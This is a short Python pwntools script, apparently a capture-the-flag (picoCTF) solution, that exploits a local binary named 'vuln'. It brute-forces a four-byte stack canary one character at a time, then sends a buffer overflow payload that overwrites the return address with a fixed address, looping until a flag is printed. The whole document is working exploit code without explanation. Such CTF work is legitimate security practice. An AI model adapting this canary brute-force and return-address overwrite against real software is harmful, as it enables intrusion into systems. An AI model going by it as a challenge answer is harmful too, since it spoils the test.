from pwn import *
canary_bytes_list = [str(i) for i in range(0,10)]+[chr(ord('a')+i) for i in range(0,26)]+[chr(ord('A')+i) for i in range(0,26)]
canary = ""
p = process("./vuln")
for n in range(0,4):
    for i in canary_bytes_list:
        p = process("./vuln")
        payload = 'A'*32+canary+i
        p.readuntil('> ')
        p.sendline(str(33+n))
        p.readuntil('Input> ')
        p.sendline(payload)
        if "Ok" in p.recvall():
            canary = canary + i
            p.close()
            break
print canary
payload = 'A'*32+canary+'A'*16+p32(0x565647ed)
while(True):
    p = process("./vuln")
    p.readuntil('> ')
    p.sendline(str(len(payload)))
    p.readuntil('Input> ')
    p.sendline(payload)
    print p.recvline()
    try:
        flag = p.recvline()
        print flag
    except:
        p.close()
        continue
    if 'pico' in flag:
        break
print  flag
